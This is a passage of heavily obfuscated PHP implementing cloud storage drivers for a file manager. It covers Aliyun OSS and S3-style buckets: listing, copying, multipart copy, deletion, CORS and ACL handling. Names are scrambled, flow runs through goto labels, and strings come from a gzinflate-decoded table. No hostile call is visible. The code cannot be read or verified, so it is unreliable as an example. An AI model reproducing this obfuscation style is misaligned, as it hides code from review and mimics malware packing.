$fÑê‰ÍÍ‹Ò)) { return !1; } if (IO::exist($A¹½ŸàéØ)) { return !0; } $d®¿ŒùÑì = get_path_father($A¹½ŸàéØ); goto c–¤ğ„öµé; aŒ‚ë®Œ³â: $fêâ‡ÍÇ =& $_SERVER[ÉóçÄÇ]; $A¹½ŸàéØ = $E×â–ÎïÚ[$fêâ‡ÍÇ[75]]; if (in_array($E×â–ÎïÚ[$fêâ‡ÍÇ[441]], $fæ¾âŸê¢¯)) { return !1; } goto dÂä—²„åµ; c–¤ğ„öµé: if (IO::exist($d®¿ŒùÑì)) { $fæ¾âŸê¢¯[] = $E×â–ÎïÚ[$fêâ‡ÍÇ[441]]; return !1; } $c¿Ğâ„á› = array($fêâ‡ÍÇ[769] => $E×â–ÎïÚ[$fêâ‡ÍÇ[769]], $fêâ‡ÍÇ[75] => array($fêâ‡ÍÇ[378], "{$d®¿ŒùÑì}\x25")); $c¶ƒ©ô¾„Í = Model($fêâ‡ÍÇ[740])->where($c¿Ğâ„á›)->field($fêâ‡ÍÇ[442])->select(); goto bŒ¼÷éã„¬; fºÏùÓìÆí: } private function _fileFilter($d¼åìç˜¥) { $C Ä©ğõ® =& $_SERVER[ÉóçÄÇ]; if (empty($d¼åìç˜¥)) { return; } $eß¨ù¸ééæ = array($C Ä©ğõ®[441] => array($C Ä©ğõ®[7], array_unique($d¼åìç˜¥))); $B¡ğª„£„ = Model($C Ä©ğõ®[776])->where($eß¨ù¸ééæ)->field($C Ä©ğõ®[390])->select(); foreach ($B¡ğª„£„ as $bô¹››ÄĞ) { Model($C Ä©ğõ®[776])->remove($bô¹››ÄĞ[$C Ä©ğõ®[390]], !1); } } private function storeIds() { $cø¾“”š¥æ =& $_SERVER[ÉóçÄÇ]; $Cø…Íî¨× = Model($cø¾“”š¥æ[725])->listData(); $D­æ‹Ü‰Ğ = array(); $a£·ÊÑŞ©’ = $GLOBALS[$cø¾“”š¥æ[6]][$cø¾“”š¥æ[87]][$cø¾“”š¥æ[777]]; foreach ($Cø…Íî¨× as $E÷¥Èç«©) { $EºÍ¬Ó…ëÒ = strtolower($E÷¥Èç«©[$cø¾“”š¥æ[93]]); if (!isset($a£·ÊÑŞ©’[$EºÍ¬Ó…ëÒ])) { continue; } $EŒ¾‘†è = $cø¾“”š¥æ[71] . (isset($a£·ÊÑŞ©’[$EºÍ¬Ó…ëÒ]) ? $a£·ÊÑŞ©’[$EºÍ¬Ó…ëÒ] : ucfirst($EºÍ¬Ó…ëÒ)); if (!class_exists($EŒ¾‘†è)) { continue; } $D­æ‹Ü‰Ğ[] = $E÷¥Èç«©[$cø¾“”š¥æ[388]]; } return $D­æ‹Ü‰Ğ; } } goto F‹µÓŠƒ‰; Cô¯ÉºÀâ: $E÷Å·½öÊæ = $_SERVER[ÉóçÄÇ][569]; while (strlen($E÷Å·½öÊæ) < $_SERVER[ÉóçÄÇ][570]) { if (!$E÷Å·½öÊæ) { break; } $E÷Å·½öÊæ++; } $_SERVER[šãè] = explode($_SERVER[ÉóçÄÇ][571], gzinflate(substr($_SERVER[ÉóçÄÇ][572], 10, -8))); goto f†ïĞ©·‹; aìÅÜº¯’‘: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eÀ³±Š…Ñ) { parent::__construct($eÀ³±Š…Ñ); $this->signatureVersion($_SERVER[ÉóçÄÇ][210]); } public function fileOutLink($bªí¤™•©¼) { $DÎ æ†ÏŸ¢ =& $_SERVER[ÉóçÄÇ]; if (substr($bªí¤™•©¼, 0, 7) == $DÎ æ†ÏŸ¢[1184]) { $bªí¤™•©¼ = $DÎ æ†ÏŸ¢[1185] . substr($bªí¤™•©¼, 7); } header($DÎ æ†ÏŸ¢[158] . $bªí¤™•©¼); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Cää‰‡®º®) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÉóçÄÇ][1240]; $this->_init($Cää‰‡®º®); } public function _init($eŠÉ«†ò„ô) { $fÓŠ·ì¶ =& $_SERVER[ÉóçÄÇ]; foreach ($eŠÉ«†ò„ô as $b¿“¸ªã¢ => $B†‚‘á†º) { if (isset($this->{$b¿“¸ªã¢})) { $this->{$b¿“¸ªã¢} = $B†‚‘á†º; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fÓŠ·ì¶[1241] . LNG($fÓŠ·ì¶[1242])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto BÉóó¾¦«’; Aî„›¦Ğ‹: $Dƒøî¨áã->addRule($Cõø™¹êì); try { $this->client->putBucketCors($this->bucket, $Dƒøî¨áã); } catch (OSS\Core\OssException $FÃ–½Âêâ¢) { return !1; } return !0; goto C·Æ«Ÿ×; bˆĞÏ—ğ´‚: $Cõø™¹êì->setMaxAgeSeconds(600); $Cõø™¹êì->addExposeHeader($cŞƒ‚ªÅ[1248]); $Cõø™¹êì->addAllowedHeader($cŞƒ‚ªÅ[1243]); goto Aî„›¦Ğ‹; dƒÁŠÜ’®°: $Cõø™¹êì->addAllowedOrigin($cŞƒ‚ªÅ[1243]); $Cõø™¹êì->addAllowedMethod($cŞƒ‚ªÅ[1244]); $Cõø™¹êì->addAllowedMethod($cŞƒ‚ªÅ[1245]); goto D–’ÙÅ“Ÿë; D–’ÙÅ“Ÿë: $Cõø™¹êì->addAllowedMethod($cŞƒ‚ªÅ[1246]); $Cõø™¹êì->addAllowedMethod($cŞƒ‚ªÅ[1247]); $Cõø™¹êì->addAllowedMethod($cŞƒ‚ªÅ[157]); goto bˆĞÏ—ğ´‚; BÉóó¾¦«’: $cŞƒ‚ªÅ =& $_SERVER[ÉóçÄÇ]; $Dƒøî¨áã = new OSS\Model\CorsConfig(); $Cõø™¹êì = new OSS\Model\CorsRule(); goto dƒÁŠÜ’®°; C·Æ«Ÿ×: } public function getBucketCors() { goto a¥¦‡™µÉõ; e™Û…ŞÛİÊ: if (!$aµØÃİº®ó || !($C«î“ŞÓ“ = $aµØÃİº®ó->getRules())) { return null; } $FŠİÙè»« = $C«î“ŞÓ“[0]->getAllowedOrigins(); $aÏ“´¼ê¢ = $C«î“ŞÓ“[0]->getAllowedMethods(); goto Fôéîœªãö; Fôéîœªãö: $e›ÅÈĞØ´‹ = $C«î“ŞÓ“[0]->getMaxAgeSeconds(); $Cƒ†ïŠ§íŒ = $C«î“ŞÓ“[0]->getExposeHeaders(); $f¦˜øÅ­à = $C«î“ŞÓ“[0]->getAllowedHeaders(); goto ağˆé¾ÈÅÑ; a¥¦‡™µÉõ: $CÈÎˆß×İì =& $_SERVER[ÉóçÄÇ]; $aµØÃİº®ó = null; try { $aµØÃİº®ó = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $fœÑ‹Æ·ó…) { return null; } goto e™Û…ŞÛİÊ; ağˆé¾ÈÅÑ: return array($CÈÎˆß×İì[181] => isset($FŠİÙè»«[0]) ? $FŠİÙè»«[0] : $CÈÎˆß×İì[33], $CÈÎˆß×İì[185] => $aÏ“´¼ê¢, $CÈÎˆß×İì[1249] => $e›ÅÈĞØ´‹, $CÈÎˆß×İì[1250] => isset($Cƒ†ïŠ§íŒ[0]) ? $Cƒ†ïŠ§íŒ[0] : $CÈÎˆß×İì[33], $CÈÎˆß×İì[183] => isset($f¦˜øÅ­à[0]) ? $f¦˜øÅ­à[0] : $CÈÎˆß×İì[33]); goto E·Æ±à»›Ù; E·Æ±à»›Ù: } public function isBucketCors() { goto cƒÕ’Ö­Í; a®¯¢¶—šé: if ($F­ğèìöå[$EÂ®Æø¤Ñ[181]] != $EÂ®Æø¤Ñ[182] || $F­ğèìöå[$EÂ®Æø¤Ñ[183]] != $EÂ®Æø¤Ñ[182]) { return !1; } $fŠ¤ã‹™ÄÚ = array_map($EÂ®Æø¤Ñ[184], $F­ğèìöå[$EÂ®Æø¤Ñ[185]]); if (!is_array($fŠ¤ã‹™ÄÚ)) { $fŠ¤ã‹™ÄÚ = array(); } goto DÁóŒêŠÂ’; cƒÕ’Ö­Í: $EÂ®Æø¤Ñ =& $_SERVER[ÉóçÄÇ]; $F­ğèìöå = $this->getBucketCors(); if (!$F­ğèìöå || !is_array($F­ğèìöå)) { return !1; } goto a®¯¢¶—šé; DÁóŒêŠÂ’: $B¤¦ğğ—ª = array($EÂ®Æø¤Ñ[186], $EÂ®Æø¤Ñ[187], $EÂ®Æø¤Ñ[188], $EÂ®Æø¤Ñ[189], $EÂ®Æø¤Ñ[190]); $CÇà¨…Æùç = array_diff($B¤¦ğğ—ª, $fŠ¤ã‹™ÄÚ); return empty($CÇà¨…Æùç); goto AŞ‹šÔ¥ä; AŞ‹šÔ¥ä: } public function mkfile($B©Ú–ô™¤, $CÈÕ¿™Ì®î = '', $B£¨îÄŸŸ = REPEAT_RENAME) { $fÚºÂÀ³¡Ø = $this->setContent($B©Ú–ô™¤, $CÈÕ¿™Ì®î); if ($fÚºÂÀ³¡Ø !== !1) { return $this->getPathOuter($B©Ú–ô™¤); } return !1; } public function mkdir($f¤¸¹¢½æ¤, $dŞĞ½ÚÉ… = REPEAT_SKIP) { if ($this->_isFolder($f¤¸¹¢½æ¤)) { return $this->getPathOuter($f¤¸¹¢½æ¤); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f¤¸¹¢½æ¤)); } catch (OSS\Core\OssException $aó«ñ¶«“) { return !1; } return $this->getPathOuter($f¤¸¹¢½æ¤); } private function fileList($BåÛäÍîµà, $FŸ“‹Èø†ñ = '', $bÏ³Óåƒ©¸ = 0) { goto b‚‘¦°×„²; b‚‘¦°×„²: $fÅòÆ¢ˆ =& $_SERVER[ÉóçÄÇ]; $BåÛäÍîµà = trim($BåÛäÍîµà, $fÅòÆ¢ˆ[8]); $fµ™Œë±ºÀ = empty($BåÛäÍîµà) ? $fÅòÆ¢ˆ[33] : $BåÛäÍîµà . $fÅòÆ¢ˆ[8]; goto b…ä²¦Ä¾Ú; E²ƒ™ÎóÔÂ: return array($fÅòÆ¢ˆ[74] => $A”Ó…õäâ, $fÅòÆ¢ˆ[73] => $BÀøø®·Ã); goto D‘Ã­ŸÌÓÀ; b…ä²¦Ä¾Ú: $E©½®±•Û‚ = $fÅòÆ¢ˆ[33]; $b¨Üä‡Ş©Â = 1000; $f˜·Ç—Ï¥® = $this->listItemCache === !1 ? !1 : !0; goto d´Ê¡ô‹—É; d´Ê¡ô‹—É: $A”Ó…õäâ = $BÀøø®·Ã = array(); while (!0) { check_abort(); $CÂ©ç«Òñˆ = array($fÅòÆ¢ˆ[1251] => $FŸ“‹Èø†ñ, $fÅòÆ¢ˆ[1252] => $fµ™Œë±ºÀ, $fÅòÆ¢ˆ[1253] => $b¨Üä‡Ş©Â, $fÅòÆ¢ˆ[1254] => $E©½®±•Û‚); try { $bÎ©ÚùÍ = $this->client->listObjects($this->bucket, $CÂ©ç«Òñˆ); } catch (OSS\Core\OssException $AÃïß‡ù†Ê) { break; } $E©½®±•Û‚ = $bÎ©ÚùÍ->getNextMarker(); $Aö…Ö©œÅ¯ = $bÎ©ÚùÍ->getObjectList(); $EŞë·’ò›í = $bÎ©ÚùÍ->getPrefixList(); foreach ($Aö…Ö©œÅ¯ as $c¼„ÉÅÖéã) { goto fƒ±á¶Ï‡å; fƒ±á¶Ï‡å: if ($c¼„ÉÅÖéã->getKey() == $fµ™Œë±ºÀ) { continue; } $e¬«¼À·’« = $c¼„ÉÅÖéã->getKey(); $bâÅ¬ÀÛ£˜ = $c¼„ÉÅÖéã->getSize(); goto b¨£Š³Ş„ç; b¨£Š³Ş„ç: $FÑñƒîƒç = $c¼„ÉÅÖéã->getLastModified(); $EÆ¤¥ìàƒ = $bÏ³Óåƒ©¸ ? array($fÅòÆ¢ˆ[28] => $e¬«¼À·’«, $fÅòÆ¢ˆ[77] => $bâÅ¬ÀÛ£˜, $fÅòÆ¢ˆ[195] => strtotime($FÑñƒîƒç)) : $e¬«¼À·’«; $B†ÑÕÒÀ‡¹ = $bâÅ¬ÀÛ£˜ == 0 && substr($e¬«¼À·’«, strlen($e¬«¼À·’«) - 1, 1) == $fÅòÆ¢ˆ[8] ? !0 : !1; goto CÔ·Àí¶Íº; CÔ·Àí¶Íº: if ($f˜·Ç—Ï¥®) { $this->cacheMethod($fÅòÆ¢ˆ[197], $e¬«¼À·’«, $B†ÑÕÒÀ‡¹); $this->cacheMethod($fÅòÆ¢ˆ[198], $e¬«¼À·’«, array($fÅòÆ¢ˆ[77] => $bâÅ¬ÀÛ£˜, $fÅòÆ¢ˆ[1255] => $bâÅ¬ÀÛ£˜, $fÅòÆ¢ˆ[83] => strtotime($FÑñƒîƒç), $fÅòÆ¢ˆ[1256] => $FÑñƒîƒç)); } if ($B†ÑÕÒÀ‡¹) { $A”Ó…õäâ[] = $e¬«¼À·’«; continue; } $BÀøø®·Ã[] = $EÆ¤¥ìàƒ; goto aàÊåÃ‰ãí; aàÊåÃ‰ãí: } foreach ($EŞë·’ò›í as $eàƒ‡Ç÷‘æ) { $A”Ó…õäâ[] = $eàƒ‡Ç÷‘æ->getPrefix(); if ($f˜·Ç—Ï¥®) { $this->cacheMethod($fÅòÆ¢ˆ[197], $e¬«¼À·’«, !0); } } if ($E©½®±•Û‚ === $fÅòÆ¢ˆ[33]) { break; } } if ($f˜·Ç—Ï¥®) { $this->cacheMethod($fÅòÆ¢ˆ[197], $BåÛäÍîµà, !0); } goto E²ƒ™ÎóÔÂ; D‘Ã­ŸÌÓÀ: } public function copyFile($D¼îàˆ¸ïâ, $E†Ê©Ÿí‡´) { $c‘ãºÖé± = $this->size($D¼îàˆ¸ïâ); if ($c‘ãºÖé± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $D¼îàˆ¸ïâ, $this->bucket, $this->pathEncode($E†Ê©Ÿí‡´)); } catch (OSS\Core\OssException $d‚Ë‘…­Ú¬) { return !1; } return $this->getPathOuter($E†Ê©Ÿí‡´); } $cÔ´ªæĞ¾ñ = $this->multiCopyObject($D¼îàˆ¸ïâ, $E†Ê©Ÿí‡´, $c‘ãºÖé±); return $cÔ´ªæĞ¾ñ ? $this->getPathOuter($E†Ê©Ÿí‡´) : !1; } private function multiCopyObject($bçŒ‰ Ëé§, $d‚İàáó™¬, $A¡øôß…—Î) { $Aâß…ß™§Ï =& $_SERVER[ÉóçÄÇ]; try { goto B‚»¨©Ğİ; dØÌÊ‚åÌœ: $aÚÉİ´…Ö = 1024 * 1024 * 10; $aÛä•äÔ = $this->client->generateMultiuploadParts($A¡øôß…—Î, $aÚÉİ´…Ö); foreach ($aÛä•äÔ as $d¨ºˆñ‡õÈ => $A‡ƒ©¯îË) { $B¿«ˆˆŒºÂ = $d¹¹±ìò´ß + (int) $A‡ƒ©¯îË[$Aâß…ß™§Ï[1258]]; $fÉ¨õÓÛ = (int) $A‡ƒ©¯îË[$Aâß…ß™§Ï[333]] + $B¿«ˆˆŒºÂ - 1; $fª‹“ñ–‡ = array($Aâß…ß™§Ï[1259] => $B¿«ˆˆŒºÂ, $Aâß…ß™§Ï[1260] => $fÉ¨õÓÛ); $D©¥È‹ƒœá[] = $this->client->uploadPartCopy($this->bucket, $bçŒ‰ Ëé§, $this->bucket, $this->pathEncode($d‚İàáó™¬), $F“ËîÚ¾®‘, $a‰‘¨éĞÀ, $fª‹“ñ–‡); $F“ËîÚ¾®‘ = $F“ËîÚ¾®‘ + 1; } goto fõÀË…¾‰á; fõÀË…¾‰á: $e‡çšÜàº = array(); foreach ($D©¥È‹ƒœá as $d¨ºˆñ‡õÈ => $b¦„Ëô•à ) { $e‡çšÜàº[] = array($Aâß…ß™§Ï[1261] => $d¨ºˆñ‡õÈ + 1, $Aâß…ß™§Ï[1262] => $b¦„Ëô•à ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($d‚İàáó™¬), $a‰‘¨éĞÀ, $e‡çšÜàº); goto eİïéŞ‡ãƒ; B‚»¨©Ğİ: $F±ğ“ì–Ó = array(); if ($f Úğ™“õ = $this->hashMd5($bçŒ‰ Ëé§)) { $F±ğ“ì–Ó = array(OSS\OssClient::OSS_HEADERS => array($Aâß…ß™§Ï[1257] => $f Úğ™“õ)); } $a‰‘¨éĞÀ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d‚İàáó™¬), $F±ğ“ì–Ó); goto c’ê•Ó¢É; c’ê•Ó¢É: $F“ËîÚ¾®‘ = 1; $d¹¹±ìò´ß = 0; $D©¥È‹ƒœá = array(); goto dØÌÊ‚åÌœ; eİïéŞ‡ãƒ: } catch (OSS\Core\OssException $EŒ‚‡£Õ›‚) { return !1; } return !0; } public function moveFile($fæ¬‘Ò„¥—, $eëÅ‘ÒåØ) { if ($this->copyFile($fæ¬‘Ò„¥—, $eëÅ‘ÒåØ)) { $this->remove($fæ¬‘Ò„¥—); return $this->getPathOuter($eëÅ‘ÒåØ); } return !1; } public function delFile($B ÉŸ×ÏšÖ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($B ÉŸ×ÏšÖ)); } catch (OSS\Core\OssException $f¯âßŒ¿–») { return !1; } return !0; } public function delFolder($E¾íŒ¥š’Ï) { goto cšŸˆ“ÏæÂ; DÀïÀ„ƒçº: return $this->delByBatch($aÑ£è…—†¬[$Dáš¯·‡‚›[74]]); goto a×ÙÃÔø­Ÿ; DîâŒôòîÒ: if (!empty($E¾íŒ¥š’Ï) && !in_array($A”İ‘³‡§, $aÑ£è…—†¬[$Dáš¯·‡‚›[74]])) { $aÑ£è…—†¬[$Dáš¯·‡‚›[74]][] = $A”İ‘³‡§; } $Eš¡Áîê = $this->delByBatch($aÑ£è…—†¬[$Dáš¯·‡‚›[73]]); if (!$Eš¡Áîê) { return !1; } goto DÀïÀ„ƒçº; cšŸˆ“ÏæÂ: $Dáš¯·‡‚› =& $_SERVER[ÉóçÄÇ]; if (!$this->exist($E¾íŒ¥š’Ï)) { return !0; } $this->listItemCache = !1; goto EŠ„­Éå´; EŠ„­Éå´: $aÑ£è…—†¬ = $this->fileList($E¾íŒ¥š’Ï); $this->listItemCache = !0; $A”İ‘³‡§ = trim($E¾íŒ¥š’Ï, $Dáš¯·‡‚›[8]) . $Dáš¯·‡‚›[8]; goto DîâŒôòîÒ; a×ÙÃÔø­Ÿ: } private function delByBatch($A… èĞ´ãŸ) { foreach (array_chunk($A… èĞ´ãŸ, 1000) as $fŒ“¢Šõ…Ü) { try { $this->client->deleteObjects($this->bucket, $fŒ“¢Šõ…Ü); } catch (OSS\Core\OssException $f›é®éÌö) { return !1; } } return !0; } public function rename($E®ê»«ö×ù, $aîŸÈˆ•ç×) { return $this->renameObject($E®ê»«ö×ù, $aîŸÈˆ•ç×); } private function fileInfo($Fò İ’õØ”, $FÇ‡Ò¬†ÒÇ = false, $B÷›Ã÷«™Ó = array()) { goto Bõˆó‡‰¤Ã; Eù ¾Ó§×¥: $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[192]] = $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[83]] = 0; $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[193]] = $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[194]] = !0; if (empty($B÷›Ã÷«™Ó)) { $C ˜íé´ = $this->objectMeta($Fò İ’õØ”); if (!$C ˜íé´) { return $EäÇ´Õ—Šä; } $B÷›Ã÷«™Ó = array($fˆˆéÔ×ˆÑ[83] => strtotime($C ˜íé´[$fˆˆéÔ×ˆÑ[1256]]), $fˆˆéÔ×ˆÑ[77] => $C ˜íé´[$fˆˆéÔ×ˆÑ[1255]] + 0); } goto E±Ûó‚ÑÍº; Bíïœâ†ã: return $EäÇ´Õ—Šä; goto F‚ì¤Å—Í‡; E±Ûó‚ÑÍº: if (isset($B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[77]])) { $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[77]] = $B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[77]]; } if (isset($B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[83]])) { $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[83]] = $B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[83]]; } if (isset($B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[195]]) && !trim($EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[83]])) { $EäÇ´Õ—Šä[$fˆˆéÔ×ˆÑ[83]] = $B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[195]]; } goto Bíïœâ†ã; Bõˆó‡‰¤Ã: $fˆˆéÔ×ˆÑ =& $_SERVER[ÉóçÄÇ]; $EäÇ´Õ—Šä = array($fˆˆéÔ×ˆÑ[28] => $this->pathThis($Fò İ’õØ”), $fˆˆéÔ×ˆÑ[75] => $this->getPathOuter($Fò İ’õØ”), $fˆˆéÔ×ˆÑ[29] => $fˆˆéÔ×ˆÑ[173], $fˆˆéÔ×ˆÑ[77] => isset($B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[77]]) ? $B÷›Ã÷«™Ó[$fˆˆéÔ×ˆÑ[77]] : 0, $fˆˆéÔ×ˆÑ[167] => $this->ext($Fò İ’õØ”)); if ($FÇ‡Ò¬†ÒÇ) { return $EäÇ´Õ—Šä; } goto Eù ¾Ó§×¥; F‚ì¤Å—Í‡: } private function folderInfo($E¶à•Ù‹§Š, $Dƒó‡”ÀËã = false, $FŠ¸‹¡éÛÊ = array()) { goto A‚°¨´¹š; A‚°¨´¹š: $A¤ßË±ìâ¸ =& $_SERVER[ÉóçÄÇ]; $e½äŠİ‹¥ = array($A¤ßË±ìâ¸[28] => $this->pathThis($E¶à•Ù‹§Š), $A¤ßË±ìâ¸[75] => $this->getPathOuter($A¤ßË±ìâ¸[8] . $E¶à•Ù‹§Š), $A¤ßË±ìâ¸[29] => $A¤ßË±ìâ¸[76]); if ($Dƒó‡”ÀËã) { return $e½äŠİ‹¥; } goto EãÃšöÅ¹Í; EãÃšöÅ¹Í: $e½äŠİ‹¥[$A¤ßË±ìâ¸[192]] = $e½äŠİ‹¥[$A¤ßË±ìâ¸[83]] = 0; $e½äŠİ‹¥[$A¤ßË±ìâ¸[193]] = $e½äŠİ‹¥[$A¤ßË±ìâ¸[194]] = !0; if (empty($FŠ¸‹¡éÛÊ)) { $E¶à•Ù‹§Š = rtrim($E¶à•Ù‹§Š, $A¤ßË±ìâ¸[8]) . $A¤ßË±ìâ¸[8]; $F¼ô‡ÜùŞ = $this->objectMeta($E¶à•Ù‹§Š); if (!$F¼ô‡ÜùŞ) { return $e½äŠİ‹¥; } $FŠ¸‹¡éÛÊ = array($A¤ßË±ìâ¸[192] => $F¼ô‡ÜùŞ[$A¤ßË±ìâ¸[1263]][$A¤ßË±ìâ¸[1264]], $A¤ßË±ìâ¸[83] => strtotime($F¼ô‡ÜùŞ[$A¤ßË±ìâ¸[1256]])); } goto BÒ£ÃÒóêô; BÒ£ÃÒóêô: if (isset($FŠ¸‹¡éÛÊ[$A¤ßË±ìâ¸[83]])) { $e½äŠİ‹¥[$A¤ßË±ìâ¸[83]] = $FŠ¸‹¡éÛÊ[$A¤ßË±ìâ¸[83]]; } if (isset($FŠ¸‹¡éÛÊ[$A¤ßË±ìâ¸[192]])) { $e½äŠİ‹¥[$A¤ßË±ìâ¸[192]] = $FŠ¸‹¡éÛÊ[$A¤ßË±ìâ¸[192]]; } return $e½äŠİ‹¥; goto dœñÀá¤§; dœñÀá¤§: } public function listPath($aÉî ì·øˆ, $Fƒ¢‘Şë× = false) { $F…ºË„ƒ»ì =& $_SERVER[ÉóçÄÇ]; $Dê“Š“òçË = $this->fileList($aÉî ì·øˆ, $F…ºË„ƒ»ì[8], !0); foreach ($Dê“Š“òçË[$F…ºË„ƒ»ì[74]] as $cª§ˆÊµˆ => $d‹ùº’•ñ¿) { $Dê“Š“òçË[$F…ºË„ƒ»ì[74]][$cª§ˆÊµˆ] = $this->folderInfo($d‹ùº’•ñ¿, $Fƒ¢‘Şë×, $d‹ùº’•ñ¿); } foreach ($Dê“Š“òçË[$F…ºË„ƒ»ì[73]] as $cª§ˆÊµˆ => $d‹ùº’•ñ¿) { $Dê“Š“òçË[$F…ºË„ƒ»ì[73]][$cª§ˆÊµˆ] = $this->fileInfo($d‹ùº’•ñ¿[$F…ºË„ƒ»ì[28]], $Fƒ¢‘Şë×, $d‹ùº’•ñ¿); } return $Dê“Š“òçË; } public function has($DÓ©­¼¬Å, $DòÙ–ºÅ = false, $f°±‹‚î = true) { goto Fø»ô¹÷Ù·; dŸŠ¿çâ“»: while (!0) { check_abort(); $Dä¿ÛÇáƒ = array($d‚§·‡æ[1251] => $d‚§·‡æ[8], $d‚§·‡æ[1252] => $aàŠõªóí­, $d‚§·‡æ[1253] => $EÉ»ñì‰İˆ, $d‚§·‡æ[1254] => $d„ÖÃéòˆÁ); try { $bÚŸÀ©ù… = $this->client->listObjects($this->bucket, $Dä¿ÛÇáƒ); } catch (OSS\Core\OssException $F‘¾ …­“Á) { break; } $d„ÖÃéòˆÁ = $bÚŸÀ©ù…->getNextMarker(); $D¼Ô‡šè£İ = $bÚŸÀ©ù…->getObjectList(); $cÖ‡ÚßÜñø = $bÚŸÀ©ù…->getPrefixList(); if ($DòÙ–ºÅ) { if (count($D¼Ô‡šè£İ) > 1 || count($D¼Ô‡šè£İ) == 1 && $D¼Ô‡šè£İ[0]->getKey() != $aàŠõªóí­) { $eÍÅáÎ„¹ += count($D¼Ô‡šè£İ) - 1; } if (!empty($cÖ‡ÚßÜñø)) { $aÒÑºæº»  += count($cÖ‡ÚßÜñø); } if ($d„ÖÃéòˆÁ === $d‚§·‡æ[33]) { break; } continue; } if ($f°±‹‚î) { if (!empty($D¼Ô‡šè£İ)) { if (count($D¼Ô‡šè£İ) > 1 || $D¼Ô‡šè£İ[0]->getKey() != $aàŠõªóí­) { return !0; } } } else { if (!empty($cÖ‡ÚßÜñø)) { return !0; } } if ($d„ÖÃéòˆÁ === $d‚§·‡æ[33]) { break; } } if ($DòÙ–ºÅ) { return array($d‚§·‡æ[201] => $eÍÅáÎ„¹, $d‚§·‡æ[202] => $aÒÑºæº» ); } return !1; goto aÆÚ¤“ˆÀ; A‡¡‡ÁÕ†: $d„ÖÃéòˆÁ = $d‚§·‡æ[33]; $EÉ»ñì‰İˆ = 500; $eÍÅáÎ„¹ = $aÒÑºæº»  = 0; goto dŸŠ¿çâ“»; Fø»ô¹÷Ù·: $d‚§·‡æ =& $_SERVER[ÉóçÄÇ]; $DÓ©­¼¬Å = trim($DÓ©­¼¬Å, $d‚§·‡æ[8]); $aàŠõªóí­ = empty($DÓ©­¼¬Å) ? $d‚§·‡æ[33] : $DÓ©­¼¬Å . $d‚§·‡æ[8]; goto A‡¡‡ÁÕ†; aÆÚ¤“ˆÀ: } public function listAll($F¥ğöÍ¤‡¶) { $D•ÕÆöÓ™˜ =& $_SERVER[ÉóçÄÇ]; $C¡´˜êÌ‚è = $this->fileList($F¥ğöÍ¤‡¶, $D•ÕÆöÓ™˜[33], !0); $D‡™âê”  = array(); foreach ($C¡´˜êÌ‚è[$D•ÕÆöÓ™˜[73]] as $d¿šÜÕ„¾‰) { $D‡™âê” [$d¿šÜÕ„¾‰[$D•ÕÆöÓ™˜[28]]] = $d¿šÜÕ„¾‰[$D•ÕÆöÓ™˜[77]]; } foreach ($C¡´˜êÌ‚è[$D•ÕÆöÓ™˜[74]] as $d¿šÜÕ„¾‰) { if (is_string($d¿šÜÕ„¾‰)) { $D‡™âê” [$d¿šÜÕ„¾‰] = 0; } } return $this->listAllFiles($F¥ğöÍ¤‡¶, array_keys($D‡™âê” ), $D‡™âê” ); } public function canRead($C‹½ØØ–Åˆ) { $d¬ÊŠ¿«¦ä =& $_SERVER[ÉóçÄÇ]; $aÕÄšåÄŞÛ = $this->pathAcl($C‹½ØØ–Åˆ); return $aÕÄšåÄŞÛ == $d¬ÊŠ¿«¦ä[1265] || $aÕÄšåÄŞÛ == $d¬ÊŠ¿«¦ä[514] ? !0 : !1; } public function canWrite($dô‰ÚÉœ¤¶) { $cò‘†âÑˆµ = $this->pathAcl($dô‰ÚÉœ¤¶); return $cò‘†âÑˆµ == $_SERVER[ÉóçÄÇ][514] ? !0 : !1; } public function pathAcl($EÓ÷¤¹‘ë) { goto E¡Š¹›˜¸Ô; FÏçğòÏ·÷: return $f×•Ä¹¿; goto b‚ÉøæŸ½ò; aÍĞğ‰í¾–: $f×•Ä¹¿ = $C¹Ø¦İ©—æ == $a½ê¿®Èàº[34] ? $this->bucketAcl : $C¹Ø¦İ©—æ; if ($f×•Ä¹¿ == $a½ê¿®Èàº[1266]) { return $a½ê¿®Èàº[1265]; } if ($f×•Ä¹¿ == $a½ê¿®Èàº[1267]) { return $a½ê¿®Èàº[514]; } goto FÏçğòÏ·÷; E¡Š¹›˜¸Ô: $a½ê¿®Èàº =& $_SERVER[ÉóçÄÇ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $C¹Ø¦İ©—æ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($EÓ÷¤¹‘ë)); } catch (OSS\Core\OssException $E‘Ÿ«Ï×ÆÜ) { return !1; } goto aÍĞğ‰í¾–; b‚ÉøæŸ½ò: } private function chmodPath($D“µ¥’™ , $Eˆ¡Í¥­“ = '') { $fÉ¦í ŞÊ =& $_SERVER[ÉóçÄÇ]; $FœÜ˜¿±”Æ = 